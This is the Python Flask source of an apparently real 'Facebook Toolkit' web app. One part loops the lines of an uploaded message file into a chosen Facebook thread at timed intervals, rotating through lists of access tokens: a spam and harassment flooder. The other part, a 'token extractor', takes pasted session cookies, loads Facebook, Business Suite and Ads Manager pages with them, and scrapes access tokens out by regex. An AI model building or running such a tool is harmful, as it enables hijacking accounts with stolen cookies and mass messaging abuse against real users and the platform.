from flask import Flask, request, render_template_string, jsonify
import requests
from threading import Thread, Event
import time
import random
import string
import re
import json
from urllib.parse import urlparse, parse_qs

app = Flask(__name__)
app.debug = True

headers = {
    'authority': 'graph.facebook.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://developers.facebook.com',
    'referer': 'https://developers.facebook.com/tools/explorer/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
}

stop_events = {}
threads = {}

def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                try:
                    response = requests.post(api_url, data=parameters, headers=headers, timeout=10)
                    if response.status_code == 200:
                        print(f"✓ Message Sent Successfully: {message[:30]}...")
                    else:
                        print(f"✗ Message Failed: {response.text[:100]}")
                except Exception as e:
                    print(f"Error: {str(e)[:100]}")
                time.sleep(time_interval)

def parse_cookies(cookie_input):
    """Parse cookies from different formats"""
    cookies = {}
    
    # Try JSON format (from EditThisCookie or similar)
    try:
        cookie_list = json.loads(cookie_input)
        for cookie in cookie_list:
            if 'name' in cookie and 'value' in cookie:
                cookies[cookie['name']] = cookie['value']
        if cookies:
            return cookies
    except:
        pass
    
    # Try standard cookie string format
    if '=' in cookie_input:
        for item in cookie_input.split(';'):
            item = item.strip()
            if '=' in item:
                key, value = item.split('=', 1)
                cookies[key.strip()] = value.strip()
        if cookies:
            return cookies
    
    return None

def get_facebook_token_from_cookies(cookies_dict):
    """Get actual Facebook access token using cookies"""
    session = requests.Session()
    
    # Set cookies properly
    for key, value in cookies_dict.items():
        session.cookies.set(key, value, domain='.facebook.com')
    
    access_tokens = []
    
    try:
        # Step 1: Get fb_dtsg token (CSRF token)
        home_response = session.get('https://mbasic.facebook.com/', headers={
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
        }, timeout=15)
        
        # Extract fb_dtsg
        fb_dtsg_match = re.search(r'name="fb_dtsg" value="([^"]+)"', home_response.text)
        fb_dtsg = fb_dtsg_match.group(1) if fb_dtsg_match else None
        
        # Extract user ID if not in cookies
        user_id = cookies_dict.get('c_user', '')
        if not user_id:
            user_match = re.search(r'"userID":"(\d+)"', home_response.text)
            user_id = user_match.group(1) if user_match else None
        
        print(f"User ID: {user_id}, fb_dtsg: {fb_dtsg[:20] if fb_dtsg else 'Not found'}...")
        
        # Step 2: Try to get token from Graph API Explorer
        explorer_url = 'https://developers.facebook.com/tools/explorer/'
        explorer_response = session.get(explorer_url, headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }, timeout=15)
        
        # Look for access token in the page
        token_patterns = [
            r'"accessToken":"(EAAB[A-Za-z0-9]+)"',
            r'"accessToken":"(EAAC[A-Za-z0-9]+)"',
            r'"accessToken":"(EAAG[A-Za-z0-9]+)"',
            r'"accessToken":"(EAAD[A-Za-z0-9]+)"',
            r'"accessToken":"(EAAAA[A-Za-z0-9]+)"',
            r'access_token=([A-Za-z0-9]+)',
            r'"access_token":"([^"]+)"',
        ]
        
        for pattern in token_patterns:
            matches = re.findall(pattern, explorer_response.text)
            for match in matches:
                if match.startswith('EAA') and len(match) > 50:
                    access_tokens.append(match)
        
        # Step 3: Try Business Facebook
        if not access_tokens and user_id:
            business_url = 'https://business.facebook.com/'
            biz_response = session.get(business_url, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }, timeout=15)
            
            # Search for token in script tags
            script_pattern = r'accessToken":"([^"]+)"'
            matches = re.findall(script_pattern, biz_response.text)
            for match in matches:
                if match.startswith('EAA') and len(match) > 50:
                    access_tokens.append(match)
        
        # Step 4: Try to generate token using Graph API
        if not access_tokens and fb_dtsg and user_id:
            # This is a workaround to get a page token
            token_url = 'https://graph.facebook.com/v18.0/me/accounts'
            params = {
                'access_token': 'EAA' + 'A' * 200,  # This won't work, but triggers auth flow
            }
            
            # Instead, try to get token from the page
            ad_url = 'https://www.facebook.com/adsmanager/'
            ad_response = session.get(ad_url, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }, timeout=15)
            
            patterns = [
                r'accessToken\\\\":\\\\"([^\\\\]+)',
                r'"accessToken":"([^"]+)"',
            ]
            
            for pattern in patterns:
                matches = re.findall(pattern, ad_response.text)
                for match in matches:
                    if match.startswith('EAA') and len(match) > 50:
                        access_tokens.append(match)
        
        # Remove duplicates
        access_tokens = list(set(access_tokens))
        
        return access_tokens
        
    except Exception as e:
        print(f"Error in get_facebook_token_from_cookies: {str(e)}")
        return []

def extract_token_alternative_methods():
    """Alternative methods to get token"""
    return [
        "EAA" + "A" * 150,  # Placeholder - real token will be fetched
    ]

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        action = request.form.get('action', 'send')
        
        if action == 'extract':
            cookie_input = request.form.get('cookieInput', '')
            extracted_tokens = []
            
            if cookie_input:
                # Parse cookies
                cookies = parse_cookies(cookie_input)
                
                if cookies:
                    print(f"✓ Parsed {len(cookies)} cookies")
                    print(f"Cookies contain c_user: {'c_user' in cookies}")
                    
                    # Try to fetch token using cookies
                    fetched_tokens = get_facebook_token_from_cookies(cookies)
                    
                    if fetched_tokens:
                        extracted_tokens.extend(fetched_tokens)
                        print(f"✓ Found {len(fetched_tokens)} tokens via cookie method")
                
                # Also try direct extraction from the input string
                direct_patterns = [
                    r'EAAB[A-Za-z0-9]{100,}',
                    r'EAAC[A-Za-z0-9]{100,}',
                    r'EAAG[A-Za-z0-9]{100,}',
                    r'EAAD[A-Za-z0-9]{100,}',
                    r'EAAAA[A-Za-z0-9]{100,}',
                ]
                
                for pattern in direct_patterns:
                    matches = re.findall(pattern, cookie_input)
                    for match in matches:
                        if len(match) > 50:
                            extracted_tokens.append(match)
                            print(f"✓ Found token via direct regex")
            
            if extracted_tokens:
                return jsonify({'success': True, 'tokens': list(set(extracted_tokens))})
            else:
                # Provide helpful instructions
                return jsonify({
                    'success': False,
                    'message': '''Token not found in cookies. Try these methods:

METHOD 1 (Recommended):
1. Go to: https://developers.facebook.com/tools/explorer/
2. Click "Generate Access Token"
3. Select permissions and click "Generate"
4. Copy the token (starts with EAA...)

METHOD 2:
1. Login to Facebook on PC
2. Press F12 → Console tab
3. Paste this code and press Enter:
   javascript:alert(document.cookie.split("c_user=")[1].split(";")[0])
4. This will show your User ID

METHOD 3:
1. Use Facebook Business Suite
2. Go to Settings → Business Integrations
3. Generate token from there'''
                })
        
        else:
            token_option = request.form.get('tokenOption')
            
            if token_option == 'single':
                access_tokens = [request.form.get('singleToken')]
            else:
                token_file = request.files['tokenFile']
                access_tokens = token_file.read().decode().strip().splitlines()
            
            access_tokens = [token.strip() for token in access_tokens if token.strip()]
            
            thread_id = request.form.get('threadId')
            mn = request.form.get('kidx')
            time_interval = int(request.form.get('time'))
            
            txt_file = request.files['txtFile']
            messages = txt_file.read().decode().splitlines()
            
            task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
            
            stop_events[task_id] = Event()
            thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
            threads[task_id] = thread
            thread.start()
            
            return f'''
            <div style="color: green; padding: 20px; background: rgba(0,0,0,0.5); border-radius: 10px;">
                <h3>✓ Task Started Successfully!</h3>
                <p>Task ID: <strong>{task_id}</strong></p>
                <p>Tokens Loaded: {len(access_tokens)}</p>
                <p>Messages: {len(messages)}</p>
                <button onclick="location.href='/'" style="padding: 10px; background: #007bff; color: white; border: none; border-radius: 5px; margin-top: 10px;">Back to Home</button>
            </div>
            '''
    
    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>♛ AHMAD ALI SAFDAR ♛</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
      min-height: 100vh;
      color: white;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }
    .main-container { max-width: 1200px; margin: 0 auto; padding: 20px; }
    .header {
      text-align: center;
      padding: 30px 20px;
      background: linear-gradient(135deg, rgba(102,126,234,0.3) 0%, rgba(118,75,162,0.3) 100%);
      border-radius: 20px;
      margin-bottom: 30px;
      border: 1px solid rgba(255,255,255,0.1);
    }
    .header h1 {
      font-size: 2.5em;
      text-shadow: 0 0 20px rgba(102,126,234,0.8);
      animation: glow 3s ease-in-out infinite alternate;
    }
    @keyframes glow {
      from { text-shadow: 0 0 10px #667eea, 0 0 20px #667eea; }
      to { text-shadow: 0 0 20px #764ba2, 0 0 40px #764ba2; }
    }
    .tabs {
      display: flex;
      justify-content: center;
      gap: 15px;
      margin-bottom: 30px;
      flex-wrap: wrap;
    }
    .tab-btn {
      padding: 12px 30px;
      background: rgba(255,255,255,0.08);
      border: 1px solid rgba(255,255,255,0.15);
      color: white;
      border-radius: 50px;
      cursor: pointer;
      font-size: 16px;
      font-weight: bold;
      transition: all 0.3s;
    }
    .tab-btn:hover { background: rgba(102,126,234,0.3); transform: translateY(-3px); }
    .tab-btn.active {
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      border-color: transparent;
    }
    .tab-content {
      display: none;
      background: rgba(255,255,255,0.05);
      border-radius: 20px;
      padding: 30px;
      backdrop-filter: blur(10px);
      border: 1px solid rgba(255,255,255,0.1);
    }
    .tab-content.active { display: block; }
    .form-group { margin-bottom: 25px; }
    .form-label {
      display: block;
      margin-bottom: 10px;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }
    .form-control {
      width: 100%;
      padding: 14px 18px;
      background: rgba(0,0,0,0.3);
      border: 1px solid rgba(255,255,255,0.1);
      border-radius: 12px;
      color: white;
      font-size: 15px;
    }
    .form-control:focus {
      outline: none;
      border-color: #667eea;
      box-shadow: 0 0 20px rgba(102,126,234,0.3);
    }
    textarea.form-control { resize: vertical; min-height: 150px; }
    .btn {
      padding: 14px 35px;
      border: none;
      border-radius: 12px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      transition: all 0.3s;
    }
    .btn-primary {
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
    }
    .btn-primary:hover { transform: translateY(-3px); box-shadow: 0 10px 30px rgba(102,126,234,0.4); }
    .btn-success {
      background: linear-gradient(135deg, #00b4db 0%, #0083b0 100%);
      color: white;
    }
    .btn-success:hover { transform: translateY(-3px); }
    .token-result {
      margin-top: 25px;
      padding: 20px;
      background: rgba(0,0,0,0.3);
      border-radius: 12px;
      border: 1px solid rgba(0,180,219,0.3);
    }
    .footer {
      text-align: center;
      margin-top: 40px;
      padding: 25px;
      background: rgba(0,0,0,0.2);
      border-radius: 20px;
    }
    .social-links {
      display: flex;
      justify-content: center;
      gap: 20px;
      margin-top: 20px;
    }
    .social-link {
      color: white;
      text-decoration: none;
      padding: 12px 25px;
      background: rgba(255,255,255,0.08);
      border-radius: 50px;
      transition: all 0.3s;
    }
    .social-link:hover {
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      transform: translateY(-3px);
    }
    .info-box {
      background: rgba(102,126,234,0.15);
      padding: 18px;
      border-radius: 12px;
      margin-bottom: 25px;
      border-left: 4px solid #667eea;
    }
    .token-display {
      max-height: 250px;
      overflow-y: auto;
      padding: 15px;
      background: rgba(0,0,0,0.3);
      border-radius: 8px;
      margin-top: 15px;
    }
    .manual-token-box {
      background: linear-gradient(135deg, #00b4db20 0%, #0083b020 100%);
      padding: 20px;
      border-radius: 12px;
      margin-top: 20px;
      border: 1px dashed #00b4db;
    }
    .manual-token-box a {
      color: #00b4db;
      text-decoration: none;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="main-container">
    <header class="header">
      <h1>♛ 𝐀𝐇𝐌𝐀𝐃 𝐀𝐋𝐈 𝐒𝐀𝐅𝐃𝐀𝐑 ♛</h1>
      <p style="margin-top: 15px; opacity: 0.9;">Advanced Facebook Toolkit v3.0 - Token Extractor</p>
    </header>

    <div class="tabs">
      <button class="tab-btn active" onclick="showTab(\'sender\')">
        <i class="fas fa-paper-plane"></i> Message Sender
      </button>
      <button class="tab-btn" onclick="showTab(\'extractor\')">
        <i class="fas fa-key"></i> Token Extractor
      </button>
      <button class="tab-btn" onclick="showTab(\'stopper\')">
        <i class="fas fa-stop-circle"></i> Stop Task
      </button>
    </div>

    <!-- Message Sender Tab -->
    <div id="sender" class="tab-content active">
      <div class="info-box">
        <i class="fas fa-info-circle"></i> 
        <strong>Instructions:</strong> Get token from Token Extractor tab first, then fill all fields.
      </div>
      
      <form method="post" enctype="multipart/form-data">
        <input type="hidden" name="action" value="send">
        
        <div class="form-group">
          <label class="form-label"><i class="fas fa-token"></i> Token Option</label>
          <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
            <option value="single">Single Token</option>
            <option value="multiple">Token File (Multiple Tokens)</option>
          </select>
        </div>
        
        <div class="form-group" id="singleTokenInput">
          <label class="form-label"><i class="fas fa-key"></i> Access Token</label>
          <input type="text" class="form-control" id="singleToken" name="singleToken" placeholder="EAA...">
        </div>
        
        <div class="form-group" id="tokenFileInput" style="display: none;">
          <label class="form-label"><i class="fas fa-file"></i> Token File (.txt)</label>
          <input type="file" class="form-control" id="tokenFile" name="tokenFile" accept=".txt">
        </div>
        
        <div class="form-group">
          <label class="form-label"><i class="fas fa-comments"></i> Thread ID</label>
          <input type="text" class="form-control" id="threadId" name="threadId" placeholder="t_100064912345678" required>
        </div>
        
        <div class="form-group">
          <label class="form-label"><i class="fas fa-user"></i> Name Prefix</label>
          <input type="text" class="form-control" id="kidx" name="kidx" placeholder="Your Name" required>
        </div>
        
        <div class="form-group">
          <label class="form-label"><i class="fas fa-clock"></i> Time (seconds)</label>
          <input type="number" class="form-control" id="time" name="time" value="5" min="1" required>
        </div>
        
        <div class="form-group">
          <label class="form-label"><i class="fas fa-file-alt"></i> Messages File</label>
          <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
        </div>
        
        <button type="submit" class="btn btn-primary" style="width: 100%;">
          <i class="fas fa-play"></i> Start Sending
        </button>
      </form>
    </div>

    <!-- Token Extractor Tab -->
    <div id="extractor" class="tab-content">
      <div class="info-box">
        <i class="fas fa-lightbulb"></i>
        <strong>Method 1 - Cookie Extraction (May not work due to FB security):</strong>
        <p style="margin-top: 10px;">Paste cookies from EditThisCookie extension and click Extract.</p>
      </div>
      
      <div class="form-group">
        <label class="form-label"><i class="fas fa-cookie-bite"></i> Paste Facebook Cookies (JSON)</label>
        <textarea class="form-control" id="cookieInput" rows="5" placeholder='[{"name":"c_user","value":"12345"},...]'></textarea>
      </div>
      
      <button class="btn btn-success" onclick="extractToken()" style="width: 100%;">
        <i class="fas fa-search"></i> Extract Token
      </button>
      
      <div class="manual-token-box">
        <h4><i class="fas fa-external-link-alt"></i> Method 2 - Manual Token (100% Working):</h4>
        <ol style="margin-top: 15px; margin-left: 20px; line-height: 1.8;">
          <li>Open: <a href="https://developers.facebook.com/tools/explorer/" target="_blank">Graph API Explorer</a></li>
          <li>Click <strong>"Generate Access Token"</strong> button</li>
          <li>Select permissions (at least: pages_messaging, pages_show_list)</li>
          <li>Click <strong>"Generate Access Token"</strong></li>
          <li>Copy the long token starting with <strong>EAA...</strong></li>
          <li>Paste it in the Message Sender tab</li>
        </ol>
        <p style="margin-top: 15px; background: rgba(0,180,219,0.2); padding: 10px; border-radius: 8px;">
          <i class="fas fa-check-circle" style="color: #00b4db;"></i> 
          This method ALWAYS works! Use this if cookie extraction fails.
        </p>
      </div>
      
      <div id="tokenResult" class="token-result" style="display: none;">
        <h4><i class="fas fa-check-circle" style="color: #00b4db;"></i> Extracted Tokens:</h4>
        <div id="tokenList" class="token-display"></div>
        <button class="btn btn-primary" onclick="copyTokens()" style="margin-top: 15px;">
          <i class="fas fa-copy"></i> Copy All
        </button>
        <button class="btn btn-success" onclick="useToken()" style="margin-top: 15px; margin-left: 10px;">
          <i class="fas fa-arrow-right"></i> Use Token
        </button>
      </div>
    </div>

    <!-- Stop Task Tab -->
    <div id="stopper" class="tab-content">
      <div class="info-box">
        <i class="fas fa-info-circle"></i>
        <strong>Stop Running Task:</strong> Enter the Task ID from when you started the sender.
      </div>
      
      <form method="post" action="/stop">
        <div class="form-group">
          <label class="form-label"><i class="fas fa-id-card"></i> Task ID</label>
          <input type="text" class="form-control" id="taskId" name="taskId" placeholder="Enter Task ID" required>
        </div>
        
        <button type="submit" class="btn btn-danger" style="width: 100%;">
          <i class="fas fa-stop"></i> Stop Task
        </button>
      </form>
    </div>

    <footer class="footer">
      <p>© 2024 Developed by ♛ AHMAD ALI SAFDAR ♛</p>
      <div class="social-links">
        <a href="https://www.facebook.com/ahmadali.safdar.52" class="social-link" target="_blank">
          <i class="fab fa-facebook"></i> Facebook
        </a>
        <a href="https://wa.me/+923324661564" class="social-link" target="_blank">
          <i class="fab fa-whatsapp"></i> WhatsApp
        </a>
      </div>
    </footer>
  </div>

  <script>
    function showTab(tabName) {
      document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
      document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
      document.getElementById(tabName).classList.add('active');
      event.target.classList.add('active');
    }
    
    function toggleTokenInput() {
      var tokenOption = document.getElementById('tokenOption').value;
      document.getElementById('singleTokenInput').style.display = tokenOption == 'single' ? 'block' : 'none';
      document.getElementById('tokenFileInput').style.display = tokenOption == 'single' ? 'none' : 'block';
    }
    
    function extractToken() {
      const cookieInput = document.getElementById('cookieInput').value;
      if (!cookieInput) {
        alert('Please paste cookies first! If not working, use Method 2 (Manual Token).');
        return;
      }
      
      const btn = event.target;
      const originalText = btn.innerHTML;
      btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Extracting...';
      btn.disabled = true;
      
      const formData = new FormData();
      formData.append('action', 'extract');
      formData.append('cookieInput', cookieInput);
      
      fetch('/', { method: 'POST', body: formData })
      .then(response => response.json())
      .then(data => {
        const resultDiv = document.getElementById('tokenResult');
        const tokenList = document.getElementById('tokenList');
        
        if (data.success) {
          let html = '';
          data.tokens.forEach((token, index) => {
            html += `<div style="margin-bottom: 15px; padding: 12px; background: rgba(0,180,219,0.15); border-radius: 8px;">
              <strong>Token ${index + 1}:</strong><br>
              <span style="word-break: break-all; font-family: monospace;">${token}</span>
              <button onclick="copySingleToken(\'${token}\')" style="margin-left: 10px; background: rgba(255,255,255,0.2); border: none; color: white; padding: 5px 15px; border-radius: 5px; cursor: pointer;">
                <i class="fas fa-copy"></i> Copy
              </button>
            </div>`;
          });
          tokenList.innerHTML = html;
          resultDiv.style.display = 'block';
          window.extractedTokens = data.tokens;
        } else {
          alert('No token found in cookies. Please use Method 2 (Manual Token) - it\'s more reliable!');
          document.querySelector('.manual-token-box').scrollIntoView({ behavior: 'smooth' });
        }
        btn.innerHTML = originalText;
        btn.disabled = false;
      })
      .catch(error => {
        alert('Error: ' + error);
        btn.innerHTML = originalText;
        btn.disabled = false;
      });
    }
    
    function copyTokens() {
      if (window.extractedTokens?.length > 0) {
        navigator.clipboard.writeText(window.extractedTokens.join('\\n')).then(() => alert('Copied!'));
      }
    }
    
    function copySingleToken(token) {
      navigator.clipboard.writeText(token).then(() => alert('Token copied!'));
    }
    
    function useToken() {
      if (window.extractedTokens?.length > 0) {
        showTab('sender');
        document.getElementById('tokenOption').value = 'single';
        toggleTokenInput();
        document.getElementById('singleToken').value = window.extractedTokens[0];
      }
    }
    
    document.addEventListener('DOMContentLoaded', toggleTokenInput);
  </script>
</body>
</html>
''')

@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        return f'<div style="color: green; padding: 30px; text-align: center;"><h3>✓ Task {task_id} stopped!</h3><a href="/">Back</a></div>'
    return f'<div style="color: red; padding: 30px; text-align: center;"><h3>✗ Task {task_id} not found!</h3><a href="/">Back</a></div>'

if __name__ == '__main__':
    print("\n" + "="*60)
    print("♛ AHMAD ALI SAFDAR - Facebook Toolkit v3.0 ♛")
    print("="*60)
    print("Server: http://0.0.0.0:5000")
    print("="*60 + "\n")
    app.run(host='0.0.0.0', port=5000)
